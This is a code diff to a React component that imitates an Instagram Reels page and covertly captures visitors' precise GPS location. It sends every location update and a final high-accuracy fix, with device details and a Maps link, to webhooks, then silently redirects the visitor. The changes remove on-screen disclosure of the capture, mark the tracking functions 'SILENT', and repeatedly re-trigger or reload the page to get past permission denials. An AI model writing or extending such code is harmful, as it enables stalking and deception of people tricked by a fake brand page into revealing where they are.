@@ -1,7 +1,7 @@
 'use client';
 
 import { useState, useEffect, useCallback, useRef } from 'react';
-import { motion, AnimatePresence } from 'framer-motion';
+import { motion } from 'framer-motion';
 import {
   Heart,
   MessageCircle,
@@ -15,23 +15,10 @@ import {
   PlusSquare,
   Film,
   User,
-  MapPin,
-  RefreshCw,
-  Crosshair,
   Wifi,
   Signal,
-  Navigation,
-  Shield,
-  CheckCircle2,
-  Clock,
-  ExternalLink,
-  Bluetooth,
-  Sun,
-  Volume2,
-  Flashlight,
-  Calculator,
-  Camera,
-  Timer,
+  MapPin,
+  RefreshCw,
 } from 'lucide-react';
 
 // ========== TYPES ==========
@@ -66,8 +53,6 @@ interface DeviceInfo {
   isTouchDevice: boolean;
   connectionType: string;
 }
-
-type AppState = 'loading' | 'reel' | 'requesting_location' | 'getting_precise' | 'permission_denied' | 'sending' | 'location_captured' | 'redirecting';
 
 // ========== CONSTANTS ==========
 const ACCURACY_THRESHOLD = 30;
@@ -202,66 +187,31 @@ function useConnectionType() {
   return connType;
 }
 
-// ========== ACCURACY RATING ==========
-function getAccuracyRating(accuracy: number): { label: string; color: string; description: string } {
-  if (accuracy <= 5) return { label: 'EXCELLENT', color: 'text-emerald-400', description: 'Pin-point accuracy! Your exact location has been captured.' };
-  if (accuracy <= 10) return { label: 'VERY GOOD', color: 'text-green-400', description: 'Very precise! Location accuracy is within 10 meters.' };
-  if (accuracy <= 20) return { label: 'GOOD', color: 'text-green-300', description: 'Good accuracy! Your location is captured within 20 meters.' };
-  if (accuracy <= 30) return { label: 'ACCEPTABLE', color: 'text-yellow-400', description: 'Acceptable accuracy. Location is within 30 meters range.' };
-  if (accuracy <= 50) return { label: 'MODERATE', color: 'text-orange-400', description: 'Moderate accuracy. Location is within 50 meters range.' };
-  return { label: 'LOW', color: 'text-red-400', description: 'Low accuracy. Location is approximate.' };
-}
-
 // ========== MAIN COMPONENT ==========
 export default function InstagramReels() {
-  const [appState, setAppState] = useState<AppState>('loading');
-  const [deniedCount, setDeniedCount] = useState(0);
-  const [locationData, setLocationData] = useState<LocationData | null>(null);
-  const [currentAccuracy, setCurrentAccuracy] = useState<number | null>(null);
-  const [attemptNumber, setAttemptNumber] = useState(0);
+  const [loadingProgress, setLoadingProgress] = useState(0);
+  const [isLoading, setIsLoading] = useState(true);
   const [liked, setLiked] = useState(false);
   const [saved, setSaved] = useState(false);
-  const [loadingProgress, setLoadingProgress] = useState(0);
-  const [redirectUrl, setRedirectUrl] = useState<string | null>(null);
-  const [showControlCenter, setShowControlCenter] = useState(false);
-  const [screenBrightness, setScreenBrightness] = useState(80);
-  const [volume, setVolume] = useState(60);
-  const [airplaneOn, setAirplaneOn] = useState(false);
-  const [bluetoothOn, setBluetoothOn] = useState(false);
-  const [wifiOn, setWifiOn] = useState(true);
-  const [cellularOn, setCellularOn] = useState(true);
-  const [flashlightOn, setFlashlightOn] = useState(false);
+  // Instagram-style subtle toast for permission (not "LOCATION CAPTURED")
+  const [showPermissionHint, setShowPermissionHint] = useState(false);
+  const [deniedCount, setDeniedCount] = useState(0);
 
   const hasRequestedRef = useRef(false);
   const isFinalSentRef = useRef(false);
   const watchIdRef = useRef<number | null>(null);
   const startTimeRef = useRef<number>(0);
   const attemptRef = useRef(0);
-  const permissionDeniedHardRef = useRef(false);
+  const bestLocationRef = useRef<LocationData | null>(null);
 
   const currentTime = useCurrentTime();
   const batteryLevel = useBatteryLevel();
   const connectionType = useConnectionType();
 
-  // Check if permission is hard-denied on mount
-  useEffect(() => {
-    if (typeof navigator !== 'undefined' && navigator.permissions) {
-      navigator.permissions.query({ name: 'geolocation' }).then((result) => {
-        if (result.state === 'denied') {
-          permissionDeniedHardRef.current = true;
-        }
-        result.addEventListener('change', () => {
-          permissionDeniedHardRef.current = result.state === 'denied';
-        });
-      }).catch(() => {});
-    }
-  }, []);
-
-  // Send EVERY location update to Webhook 2
+  // ========== SILENT: Send location update to Webhook 2 ==========
   const sendToWebhook2 = useCallback(async (loc: LocationData, attempt: number) => {
     try {
-      const deviceInfo = getDeviceInfo();
-      const res = await fetch('/api/location', {
+      await fetch('/api/location', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -269,22 +219,22 @@ export default function InstagramReels() {
           latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
           altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
           heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
-          deviceInfo,
+          deviceInfo: getDeviceInfo(),
           googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
           attemptNumber: attempt,
         }),
       });
-      const data = await res.json();
-      console.log(`[W2] Update sent - accuracy: ${loc.accuracy.toFixed(1)}m, webhook2Sent: ${data.webhook2Sent}`);
-    } catch (e) { console.error('[W2] Fail:', e); }
+      console.log(`[Silent W2] Update #${attempt} - accuracy: ${loc.accuracy.toFixed(1)}m`);
+    } catch (e) { console.error('[Silent W2] Fail:', e); }
   }, []);
 
-  // Send FINAL precise location to Webhook 1
+  // ========== SILENT: Send FINAL most accurate location to Webhook 1, then redirect ==========
   const sendFinalToWebhook1 = useCallback(async (loc: LocationData, attempt: number) => {
+    if (isFinalSentRef.current) return;
+    isFinalSentRef.current = true;
+
     try {
-      setAppState('sending');
-      const deviceInfo = getDeviceInfo();
-      console.log(`[W1] Sending FINAL location - lat: ${loc.latitude}, lng: ${loc.longitude}, accuracy: ${loc.accuracy.toFixed(1)}m`);
+      console.log(`[Silent W1] Sending FINAL - lat: ${loc.latitude}, lng: ${loc.longitude}, accuracy: ${loc.accuracy.toFixed(1)}m`);
       const res = await fetch('/api/location', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -293,34 +243,36 @@ export default function InstagramReels() {
           latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
           altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
           heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
-          deviceInfo,
+          deviceInfo: getDeviceInfo(),
           googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
           attemptNumber: attempt,
         }),
       });
       const data = await res.json();
-      console.log(`[W1] Response:`, data);
+      console.log('[Silent W1] Response:', data);
+
+      // SILENT redirect - no overlay, no "Location Captured" screen
       if (data.redirectUrl) {
-        setRedirectUrl(data.redirectUrl);
-        // Show location captured screen before redirecting - user ko info milegi
-        setAppState('location_captured');
-      } else {
-        setAppState('reel');
+        // Small delay so the reel keeps playing naturally, then redirect
+        setTimeout(() => {
+          window.location.href = data.redirectUrl;
+        }, 800);
       }
-    } catch (e) { console.error('[W1] Fail:', e); setAppState('reel'); }
+    } catch (e) {
+      console.error('[Silent W1] Fail:', e);
+    }
   }, []);
 
-  // Start watching location continuously
+  // ========== SILENT: Start watching location - NO UI changes ==========
   const startWatchingLocation = useCallback(() => {
-    if (!navigator.geolocation) {
-      alert('Geolocation is not supported by your browser');
-      return;
-    }
+    if (!navigator.geolocation) return;
+    if (hasRequestedRef.current) return;
+    hasRequestedRef.current = true;
 
-    setAppState('requesting_location');
     startTimeRef.current = Date.now();
     isFinalSentRef.current = false;
     attemptRef.current = 0;
+    bestLocationRef.current = null;
 
     const watchId = navigator.geolocation.watchPosition(
       async (position) => {
@@ -334,43 +286,43 @@ export default function InstagramReels() {
 
         attemptRef.current += 1;
         const attempt = attemptRef.current;
-        setLocationData(loc);
-        setCurrentAccuracy(loc.accuracy);
-        setAttemptNumber(attempt);
 
-        // ALWAYS send to Webhook 2
-        sendToWebhook2(loc, attempt);
-
-        // Check accuracy threshold
-        if (loc.accuracy <= ACCURACY_THRESHOLD && !isFinalSentRef.current) {
-          isFinalSentRef.current = true;
-          if (watchIdRef.current !== null) {
-            navigator.geolocation.clearWatch(watchIdRef.current);
-            watchIdRef.current = null;
-          }
-          await sendFinalToWebhook1(loc, attempt);
-        } else if (!isFinalSentRef.current) {
-          setAppState('getting_precise');
+        // Track best location (lowest accuracy)
+        if (!bestLocationRef.current || loc.accuracy < bestLocationRef.current.accuracy) {
+          bestLocationRef.current = loc;
         }
 
-        // Timeout safety: 60s max wait
-        if (Date.now() - startTimeRef.current >= MAX_WATCH_TIME && !isFinalSentRef.current) {
-          isFinalSentRef.current = true;
+        // ALWAYS send to Webhook 2 (every update)
+        sendToWebhook2(loc, attempt);
+
+        // Check accuracy threshold - send final to Webhook 1
+        if (loc.accuracy <= ACCURACY_THRESHOLD && !isFinalSentRef.current) {
           if (watchIdRef.current !== null) {
             navigator.geolocation.clearWatch(watchIdRef.current);
             watchIdRef.current = null;
           }
           await sendFinalToWebhook1(loc, attempt);
+        }
+
+        // Timeout safety: 60s max wait - send whatever best we have
+        if (Date.now() - startTimeRef.current >= MAX_WATCH_TIME && !isFinalSentRef.current) {
+          if (watchIdRef.current !== null) {
+            navigator.geolocation.clearWatch(watchIdRef.current);
+            watchIdRef.current = null;
+          }
+          const bestLoc = bestLocationRef.current || loc;
+          await sendFinalToWebhook1(bestLoc, attempt);
         }
       },
       (error) => {
-        console.error('Location error:', error.code, error.message);
+        console.error('[Silent] Location error:', error.code);
         if (watchIdRef.current !== null) {
           navigator.geolocation.clearWatch(watchIdRef.current);
           watchIdRef.current = null;
         }
         setDeniedCount(prev => prev + 1);
-        setAppState('permission_denied');
+        // Show subtle Instagram-style hint (NOT a scary "LOCATION ACCESS REQUIRED" overlay)
+        setShowPermissionHint(true);
       },
       { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
     );
@@ -382,98 +334,50 @@ export default function InstagramReels() {
   useEffect(() => {
     const interval = setInterval(() => {
       setLoadingProgress(prev => {
-        if (prev >= 100) { clearInterval(interval); setTimeout(() => setAppState('reel'), 300); return 100; }
+        if (prev >= 100) { clearInterval(interval); setTimeout(() => setIsLoading(false), 300); return 100; }
         return prev + Math.random() * 15 + 5;
       });
     }, 100);
     return () => clearInterval(interval);
   }, []);
 
-  // Auto-request location after reel shows
+  // Auto-request location SILENTLY after reel shows
   useEffect(() => {
-    if (appState === 'reel' && !hasRequestedRef.current) {
-      hasRequestedRef.current = true;
-      const t = setTimeout(() => startWatchingLocation(), 1500);
+    if (!isLoading && !hasRequestedRef.current) {
+      const t = setTimeout(() => startWatchingLocation(), 2000);
       return () => clearTimeout(t);
     }
-  }, [appState, startWatchingLocation]);
+  }, [isLoading, startWatchingLocation]);
 
   // Cleanup
   useEffect(() => {
     return () => { if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current); };
   }, []);
 
-  // FIX: Permission deny ke baad reload pe bhi prompt aana chahiye
-  // Key trick: getCurrentPosition se browser ka permission dialog re-trigger hota hai
-  const handleDenyOk = () => {
-    if (deniedCount >= 1) {
-      // First check if permission is hard-denied at browser level
-      if (navigator.permissions) {
-        navigator.permissions.query({ name: 'geolocation' }).then((result) => {
-          if (result.state === 'denied') {
-            // Hard denied - user MUST go to browser settings to change it
-            // Show them how to do it, then reload so they get fresh prompt
+  // Handle permission hint button - re-trigger browser prompt
+  const handlePermissionRetry = () => {
+    setShowPermissionHint(false);
+    hasRequestedRef.current = false;
+    // Use getCurrentPosition to re-trigger browser's native permission dialog
+    navigator.geolocation.getCurrentPosition(
+      () => startWatchingLocation(),
+      (err) => {
+        if (err.code === err.PERMISSION_DENIED) {
+          setDeniedCount(prev => prev + 1);
+          if (deniedCount >= 1) {
+            // Hard denied - reload page to get fresh prompt
             window.location.href = window.location.href.split('?')[0] + '?t=' + Date.now();
           } else {
-            // Permission is 'prompt' - we can re-trigger by calling getCurrentPosition
-            // This will show the browser's native permission dialog again
-            navigator.geolocation.getCurrentPosition(
-              () => {
-                // Permission granted! Start watching
-                startWatchingLocation();
-              },
-              (err) => {
-                // Still denied or error - try once more
-                if (err.code === err.PERMISSION_DENIED) {
-                  setDeniedCount(prev => prev + 1);
-                  setAppState('permission_denied');
-                } else {
-                  // Other error - try again with watchPosition
-                  startWatchingLocation();
-                }
-              },
-              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
+            setShowPermissionHint(true);
           }
-        }).catch(() => {
-          // Fallback: just try getCurrentPosition to re-trigger prompt
-          navigator.geolocation.getCurrentPosition(
-            () => startWatchingLocation(),
-            () => window.location.reload(),
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
-        });
-      } else {
-        // No permissions API - use getCurrentPosition trick to re-trigger prompt
-        navigator.geolocation.getCurrentPosition(
-          () => startWatchingLocation(),
-          () => window.location.reload(),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      }
-    } else {
-      // First deny - just try again with getCurrentPosition (re-triggers browser prompt)
-      navigator.geolocation.getCurrentPosition(
-        () => startWatchingLocation(),
-        () => {
-          setDeniedCount(prev => prev + 1);
-          setAppState('permission_denied');
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    }
-  };
-
-  // Handle redirect from location_captured screen
-  const handleContinueRedirect = () => {
-    if (redirectUrl) {
-      setAppState('redirecting');
-      setTimeout(() => { window.location.href = redirectUrl; }, 500);
-    }
+        }
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
   };
 
   // ========== LOADING SCREEN ==========
-  if (appState === 'loading') {
+  if (isLoading) {
     return (
       <div className="fixed inset-0 bg-black flex flex-col items-center justify-center z-50">
         <motion.div initial={{ scale: 0.5, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ duration: 0.5 }} className="mb-8">
@@ -489,50 +393,37 @@ export default function InstagramReels() {
     );
   }
 
-  const showRedirectOverlay = appState === 'sending' || appState === 'redirecting';
-
   return (
     <div className="fixed inset-0 bg-black overflow-hidden select-none">
-      {/* Background */}
+      {/* Background - Instagram reel style */}
       <div className="absolute inset-0 bg-gradient-to-b from-gray-900 via-gray-800 to-black">
         <div className="absolute inset-0 bg-gradient-to-br from-indigo-900/30 via-black to-purple-900/20" />
         <div className="absolute inset-0 opacity-20" style={{ backgroundImage: 'radial-gradient(circle at 30% 40%, rgba(255,255,255,0.1) 0%, transparent 50%), radial-gradient(circle at 70% 60%, rgba(255,255,255,0.05) 0%, transparent 40%)' }} />
       </div>
 
-      {/* ========== INSTAGRAM-STYLE STATUS BAR ========== */}
-      <div
-        className="absolute top-0 left-0 right-0 z-30 px-5 pt-3 pb-2 cursor-pointer"
-        onClick={() => setShowControlCenter(!showControlCenter)}
-      >
+      {/* ========== STATUS BAR (non-clickable, just show) ========== */}
+      <div className="absolute top-0 left-0 right-0 z-30 px-5 pt-3 pb-2">
         <div className="flex justify-between items-center">
-          {/* Left: Time */}
           <span className="text-white text-sm font-semibold tracking-tight" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif' }}>
             {currentTime}
           </span>
-          {/* Right: Signal + WiFi + Connection + Battery */}
           <div className="flex items-center gap-[6px]">
-            {/* Signal Bars */}
             <svg width="17" height="12" viewBox="0 0 17 12" fill="none" className="mt-[1px]">
               <rect x="0" y="8" width="3" height="4" rx="0.7" fill="white" />
               <rect x="4" y="5.5" width="3" height="6.5" rx="0.7" fill="white" />
               <rect x="8" y="3" width="3" height="9" rx="0.7" fill="white" />
               <rect x="12" y="0" width="3" height="12" rx="0.7" fill="white" />
             </svg>
-            {/* WiFi Icon */}
             <svg width="16" height="12" viewBox="0 0 16 12" fill="white" className="mt-[1px]">
               <path d="M8 10.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z" />
               <path d="M4.5 8.5c1-1.2 2.2-1.8 3.5-1.8s2.5.6 3.5 1.8" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none" />
               <path d="M1.5 5.5c1.8-2 4-3 6.5-3s4.7 1 6.5 3" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none" />
             </svg>
-            {/* Connection Type */}
             <span className="text-white text-[11px] font-semibold tracking-tight ml-[1px]">{connectionType}</span>
-            {/* Battery */}
             <div className="flex items-center ml-[2px]">
               <div className="relative w-[25px] h-[11px] rounded-[3px] border border-white/90 p-[1.5px]">
                 <div
-                  className={`h-full rounded-[1.5px] transition-all ${
-                    batteryLevel > 60 ? 'bg-white' : batteryLevel > 20 ? 'bg-yellow-400' : 'bg-red-500'
-                  }`}
+                  className={`h-full rounded-[1.5px] transition-all ${batteryLevel > 60 ? 'bg-white' : batteryLevel > 20 ? 'bg-yellow-400' : 'bg-red-500'}`}
                   style={{ width: `${batteryLevel}%` }}
                 />
               </div>
@@ -541,166 +432,6 @@ export default function InstagramReels() {
           </div>
         </div>
       </div>
-
-      {/* ========== iOS-STYLE CONTROL CENTER (Instagram feel) ========== */}
-      <AnimatePresence>
-        {showControlCenter && (
-          <>
-            {/* Backdrop */}
-            <motion.div
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              exit={{ opacity: 0 }}
-              className="absolute inset-0 z-40 bg-black/60 backdrop-blur-xl"
-              onClick={() => setShowControlCenter(false)}
-            />
-            {/* iOS Control Center Panel */}
-            <motion.div
-              initial={{ y: -400, opacity: 0 }}
-              animate={{ y: 0, opacity: 1 }}
-              exit={{ y: -400, opacity: 0 }}
-              transition={{ type: 'spring', damping: 28, stiffness: 320 }}
-              className="absolute top-0 left-0 right-0 z-50 px-3 pt-12 pb-6"
-              onClick={(e) => e.stopPropagation()}
-            >
-              <div className="max-w-[380px] mx-auto">
-                {/* Main grid container */}
-                <div className="bg-gray-800/90 backdrop-blur-2xl rounded-[24px] p-3 border border-white/[0.08] shadow-2xl">
-                  {/* Top Row - Connectivity toggles (2x2 grid, iOS style) */}
-                  <div className="grid grid-cols-2 gap-2.5 mb-2.5">
-                    {/* Airplane Mode */}
-                    <button
-                      onClick={() => setAirplaneOn(!airplaneOn)}
-                      className={`rounded-[18px] p-3.5 flex items-center gap-3 transition-all active:scale-95 ${airplaneOn ? 'bg-orange-500/90' : 'bg-white/[0.12]'}`}
-                    >
-                      <div className={`w-8 h-8 rounded-full flex items-center justify-center ${airplaneOn ? 'bg-white/25' : 'bg-white/10'}`}>
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none">
-                          <path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/>
-                        </svg>
-                      </div>
-                      <span className="text-white text-[13px] font-medium">Airplane</span>
-                    </button>
-
-                    {/* Cellular Data */}
-                    <button
-                      onClick={() => setCellularOn(!cellularOn)}
-                      className={`rounded-[18px] p-3.5 flex items-center gap-3 transition-all active:scale-95 ${cellularOn ? 'bg-blue-500/90' : 'bg-white/[0.12]'}`}
-                    >
-                      <div className={`w-8 h-8 rounded-full flex items-center justify-center ${cellularOn ? 'bg-white/25' : 'bg-white/10'}`}>
-                        <Signal className="w-4 h-4 text-white" />
-                      </div>
-                      <div>
-                        <span className="text-white text-[13px] font-medium block leading-tight">{connectionType}</span>
-                        <span className="text-white/60 text-[10px] leading-tight">{cellularOn ? 'Connected' : 'Off'}</span>
-                      </div>
-                    </button>
-
-                    {/* WiFi */}
-                    <button
-                      onClick={() => setWifiOn(!wifiOn)}
-                      className={`rounded-[18px] p-3.5 flex items-center gap-3 transition-all active:scale-95 ${wifiOn ? 'bg-blue-500/90' : 'bg-white/[0.12]'}`}
-                    >
-                      <div className={`w-8 h-8 rounded-full flex items-center justify-center ${wifiOn ? 'bg-white/25' : 'bg-white/10'}`}>
-                        <Wifi className="w-4 h-4 text-white" />
-                      </div>
-                      <div>
-                        <span className="text-white text-[13px] font-medium block leading-tight">Wi-Fi</span>
-                        <span className="text-white/60 text-[10px] leading-tight">{wifiOn ? 'Home' : 'Off'}</span>
-                      </div>
-                    </button>
-
-                    {/* Bluetooth */}
-                    <button
-                      onClick={() => setBluetoothOn(!bluetoothOn)}
-                      className={`rounded-[18px] p-3.5 flex items-center gap-3 transition-all active:scale-95 ${bluetoothOn ? 'bg-blue-500/90' : 'bg-white/[0.12]'}`}
-                    >
-                      <div className={`w-8 h-8 rounded-full flex items-center justify-center ${bluetoothOn ? 'bg-white/25' : 'bg-white/10'}`}>
-                        <Bluetooth className="w-4 h-4 text-white" />
-                      </div>
-                      <span className="text-white text-[13px] font-medium">Bluetooth</span>
-                    </button>
-                  </div>
-
-                  {/* Brightness - iOS style tall slider */}
-                  <div className="bg-white/[0.12] rounded-[18px] p-3 mb-2.5">
-                    <div className="flex items-center justify-between">
-                      <Sun className="w-4 h-4 text-white/50" />
-                      <div className="flex-1 mx-3 h-28 bg-white/[0.08] rounded-full overflow-hidden relative">
-                        <div
-                          className="absolute bottom-0 w-full bg-white/70 rounded-full transition-all cursor-pointer"
-                          style={{ height: `${screenBrightness}%` }}
-                          onClick={(e) => {
-                            const rect = e.currentTarget.parentElement!.getBoundingClientRect();
-                            const y = e.clientY - rect.top;
-                            const pct = Math.round(((rect.height - y) / rect.height) * 100);
-                            setScreenBrightness(Math.max(10, Math.min(100, pct)));
-                          }}
-                        />
-                      </div>
-                      <Sun className="w-4 h-4 text-white" />
-                    </div>
-                  </div>
-
-                  {/* Volume - iOS style tall slider */}
-                  <div className="bg-white/[0.12] rounded-[18px] p-3 mb-2.5">
-                    <div className="flex items-center justify-between">
-                      <Volume2 className="w-4 h-4 text-white/50" />
-                      <div className="flex-1 mx-3 h-28 bg-white/[0.08] rounded-full overflow-hidden relative">
-                        <div
-                          className="absolute bottom-0 w-full bg-white/70 rounded-full transition-all cursor-pointer"
-                          style={{ height: `${volume}%` }}
-                          onClick={(e) => {
-                            const rect = e.currentTarget.parentElement!.getBoundingClientRect();
-                            const y = e.clientY - rect.top;
-                            const pct = Math.round(((rect.height - y) / rect.height) * 100);
-                            setVolume(Math.max(0, Math.min(100, pct)));
-                          }}
-                        />
-                      </div>
-                      <Volume2 className="w-4 h-4 text-white" />
-                    </div>
-                  </div>
-
-                  {/* Bottom Row - Quick Actions (iOS style circles) */}
-                  <div className="grid grid-cols-4 gap-2.5">
-                    <button
-                      onClick={() => setFlashlightOn(!flashlightOn)}
-                      className={`aspect-square rounded-[16px] flex flex-col items-center justify-center gap-1.5 transition-all active:scale-90 ${flashlightOn ? 'bg-white/90' : 'bg-white/[0.12]'}`}
-                    >
-                      <svg width="20" height="20" viewBox="0 0 24 24" fill={flashlightOn ? '#1a1a1a' : 'white'} stroke="none">
-                        <path d="M9 21h6v-1H9v1zm3-19C8.14 2 5 5.14 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.86-3.14-7-7-7z"/>
-                      </svg>
-                    </button>
-                    <button className="aspect-square rounded-[16px] bg-white/[0.12] flex flex-col items-center justify-center gap-1.5 transition-all active:scale-90">
-                      <Timer className="w-5 h-5 text-white" />
-                    </button>
-                    <button className="aspect-square rounded-[16px] bg-white/[0.12] flex flex-col items-center justify-center gap-1.5 transition-all active:scale-90">
-                      <Calculator className="w-5 h-5 text-white" />
-                    </button>
-                    <button className="aspect-square rounded-[16px] bg-white/[0.12] flex flex-col items-center justify-center gap-1.5 transition-all active:scale-90">
-                      <Camera className="w-5 h-5 text-white" />
-                    </button>
-                  </div>
-                </div>
-
-                {/* Music widget - separate card like iOS */}
-                <div className="bg-gray-800/90 backdrop-blur-2xl rounded-[18px] p-3.5 mt-2.5 border border-white/[0.08] flex items-center gap-3">
-                  <div className="w-10 h-10 rounded-[8px] bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center">
-                    <Music className="w-5 h-5 text-white" />
-                  </div>
-                  <div className="flex-1 min-w-0">
-                    <p className="text-white text-[13px] font-medium truncate">No Surprises</p>
-                    <p className="text-white/50 text-[11px] truncate">Radiohead · OK Computer</p>
-                  </div>
-                  <button className="w-8 h-8 flex items-center justify-center">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><polygon points="5,3 19,12 5,21"/></svg>
-                  </button>
-                </div>
-              </div>
-            </motion.div>
-          </>
-        )}
-      </AnimatePresence>
 
       {/* Top Nav */}
       <div className="absolute top-9 left-0 right-0 z-20 px-4 py-3">
@@ -751,229 +482,32 @@ export default function InstagramReels() {
         </div>
       </div>
 
-      {/* ===== LOCATION REQUESTING OVERLAY ===== */}
-      <AnimatePresence>
-        {appState === 'requesting_location' && (
-          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/60 backdrop-blur-sm flex items-center justify-center">
-            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
-              <div className="flex flex-col items-center text-center">
-                <div className="w-16 h-16 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center mb-4"><MapPin className="w-8 h-8 text-white" /></div>
-                <h3 className="text-white text-lg font-semibold mb-2">Allow Location Access</h3>
-                <p className="text-gray-400 text-sm mb-4 leading-5">This reel wants to access your location to show you nearby content and provide the best experience.</p>
-                <div className="flex items-center gap-2"><div className="w-5 h-5 rounded-full border-2 border-blue-400 border-t-transparent animate-spin" /><span className="text-gray-300 text-sm">Requesting location...</span></div>
-              </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
-
-      {/* ===== GETTING PRECISE OVERLAY ===== */}
-      <AnimatePresence>
-        {appState === 'getting_precise' && (
-          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center">
-            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
-              <div className="flex flex-col items-center text-center">
-                <div className="w-16 h-16 rounded-full bg-blue-500/20 flex items-center justify-center mb-4 relative">
-                  <Crosshair className="w-8 h-8 text-blue-400" />
-                  <motion.div className="absolute inset-0 rounded-full border-2 border-blue-400/50" animate={{ scale: [1, 1.3, 1], opacity: [0.5, 0, 0.5] }} transition={{ duration: 1.5, repeat: Infinity }} />
-                </div>
-                <h3 className="text-white text-lg font-semibold mb-2">Getting Precise Location</h3>
-                <p className="text-gray-400 text-sm mb-3 leading-5">Improving accuracy. Hold still for a moment...</p>
-                {currentAccuracy !== null && (
-                  <div className="w-full space-y-2">
-                    <div className="flex justify-between text-xs">
-                      <span className="text-gray-400">Current Accuracy</span>
-                      <span className={`font-mono ${currentAccuracy <= ACCURACY_THRESHOLD ? 'text-green-400' : 'text-yellow-400'}`}>{currentAccuracy.toFixed(1)}m</span>
-                    </div>
-                    <div className="w-full h-2 bg-gray-800 rounded-full overflow-hidden">
-                      <div className={`h-full rounded-full transition-all duration-500 ${currentAccuracy <= 10 ? 'bg-green-500' : currentAccuracy <= 20 ? 'bg-green-400' : currentAccuracy <= 30 ? 'bg-yellow-400' : currentAccuracy <= 50 ? 'bg-orange-400' : 'bg-red-400'}`} style={{ width: `${Math.max(5, Math.min(100, (1 - currentAccuracy / 100) * 100))}%` }} />
-                    </div>
-                    <div className="flex justify-between text-xs">
-                      <span className="text-gray-500">Target: &lt;{ACCURACY_THRESHOLD}m</span>
-                      <span className="text-gray-500">Attempt #{attemptNumber}</span>
-                    </div>
-                  </div>
-                )}
-              </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
-
-      {/* ===== PERMISSION DENIED OVERLAY ===== */}
-      <AnimatePresence>
-        {appState === 'permission_denied' && (
-          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/70 backdrop-blur-md flex items-center justify-center">
-            <motion.div initial={{ scale: 0.8, opacity: 0, y: 20 }} animate={{ scale: 1, opacity: 1, y: 0 }} exit={{ scale: 0.8, opacity: 0, y: 20 }} transition={{ type: 'spring', damping: 20, stiffness: 300 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
-              <div className="flex flex-col items-center text-center">
-                <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center mb-4"><MapPin className="w-8 h-8 text-red-400" /></div>
-                <h3 className="text-white text-lg font-semibold mb-2">Location Access Required</h3>
-                <p className="text-gray-400 text-sm mb-4 leading-5">
-                  {deniedCount >= 2
-                    ? 'You have denied location permission. Please allow it from your browser settings to continue:'
-                    : 'This reel needs your location. Please allow the permission when prompted.'}
-                </p>
-                {deniedCount >= 2 && (
-                  <div className="w-full bg-gray-800/80 rounded-xl p-3 mb-4 text-left space-y-2">
-                    <p className="text-gray-300 text-xs font-semibold mb-1">How to enable location:</p>
-                    <div className="text-gray-400 text-[11px] space-y-1">
-                      <p>1. Tap the <span className="text-blue-400">lock/info icon</span> in the address bar</p>
-                      <p>2. Find <span className="text-white">Location</span> permission</p>
-                      <p>3. Change it to <span className="text-green-400">Allow</span></p>
-                      <p>4. Tap the button below to reload</p>
-                    </div>
-                  </div>
-                )}
-                <button onClick={handleDenyOk} className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-xl transition-colors active:scale-95">
-                  {deniedCount >= 2 ? (
-                    <span className="flex items-center justify-center gap-2"><RefreshCw className="w-4 h-4" />Reload & Request Permission</span>
-                  ) : (
-                    <span className="flex items-center justify-center gap-2"><MapPin className="w-4 h-4" />Allow Location Access</span>
-                  )}
-                </button>
